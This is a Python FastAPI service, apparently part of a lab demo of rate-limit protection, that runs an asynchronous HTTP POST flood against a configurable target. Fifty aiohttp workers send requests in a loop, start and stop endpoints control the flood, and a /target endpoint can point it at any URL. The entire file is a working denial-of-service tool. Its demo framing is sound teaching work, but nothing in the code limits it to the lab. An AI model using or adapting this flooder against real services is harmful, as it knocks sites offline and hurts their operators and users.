import asyncio
import os
import time
from contextlib import asynccontextmanager

import aiohttp
from fastapi import FastAPI
import uvicorn

# ── Estado global ──────────────────────────────────────────────────────────────
target_url: str = os.environ.get("TARGET_URL", "http://esc3-target:5000/reservar")
workers: int = int(os.environ.get("WORKERS", "50"))
protection_mode: bool = False

running: bool = False
stats = {
    "sent": 0,
    "ok": 0,
    "failed": 0,
    "rps": 0.0,
    "avg_response_ms": 0.0,
}
_flood_task: asyncio.Task | None = None
_response_times: list[float] = []
_window_start: float = time.time()
_window_count: int = 0


# ── Flood ──────────────────────────────────────────────────────────────────────
async def flood_worker(session: aiohttp.ClientSession) -> None:
    global stats, _response_times, _window_count
    timeout = aiohttp.ClientTimeout(total=3)
    while running:
        t0 = time.time()
        try:
            async with session.post(target_url, timeout=timeout) as resp:
                await resp.read()
                elapsed = (time.time() - t0) * 1000
                stats["ok"] += 1
                _response_times.append(elapsed)
        except Exception:
            stats["failed"] += 1
            _response_times.append(3000.0)
        stats["sent"] += 1
        _window_count += 1


async def rps_ticker() -> None:
    global stats, _window_start, _window_count, _response_times
    while running:
        await asyncio.sleep(1)
        elapsed = time.time() - _window_start
        stats["rps"] = round(_window_count / elapsed, 1) if elapsed > 0 else 0
        if _response_times:
            stats["avg_response_ms"] = round(sum(_response_times) / len(_response_times), 1)
            _response_times = []
        _window_start = time.time()
        _window_count = 0


async def run_flood() -> None:
    connector = aiohttp.TCPConnector(limit=workers + 10)
    async with aiohttp.ClientSession(connector=connector) as session:
        flood_tasks = [asyncio.create_task(flood_worker(session)) for _ in range(workers)]
        ticker = asyncio.create_task(rps_ticker())
        await asyncio.gather(*flood_tasks, ticker, return_exceptions=True)


# ── FastAPI ────────────────────────────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    yield


app = FastAPI(lifespan=lifespan)


@app.post("/start")
async def start_attack():
    global running, _flood_task, stats, protection_mode, target_url
    if running:
        return {"status": "already_running", "target": target_url}
    running = True
    protection_mode = False
    # Reset al target DIRECTO: tras un ciclo de protección, target_url quedaba
    # apuntando al proxy, así que un nuevo ataque iba al proxy (rate-limited) en
    # vez del target. Resetear aquí hace cada ciclo de demo repetible.
    target_url = os.environ.get("TARGET_URL", "http://esc3-target:5000/reservar")
    stats.update({"sent": 0, "ok": 0, "failed": 0, "rps": 0.0, "avg_response_ms": 0.0})
    _flood_task = asyncio.create_task(run_flood())
    return {"status": "started", "target": target_url, "workers": workers}


@app.post("/stop")
async def stop_attack():
    global running, _flood_task, protection_mode
    if not running:
        return {"status": "already_stopped"}
    running = False
    protection_mode = False
    if _flood_task:
        _flood_task.cancel()
        _flood_task = None
    return {"status": "stopped", "final_stats": dict(stats)}


@app.post("/target")
async def change_target(body: dict):
    global target_url, protection_mode
    new_url = body.get("url", "")
    if not new_url:
        return {"error": "missing url"}
    target_url = new_url
    protection_mode = True
    return {"status": "target_changed", "url": target_url, "protection": True}


@app.get("/metrics")
async def get_metrics():
    return {
        "running": running,
        "protection": protection_mode,
        "target": target_url,
        "workers": workers,
        **stats,
    }


@app.get("/health")
async def health():
    return {"status": "ok"}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5001, log_level="warning")
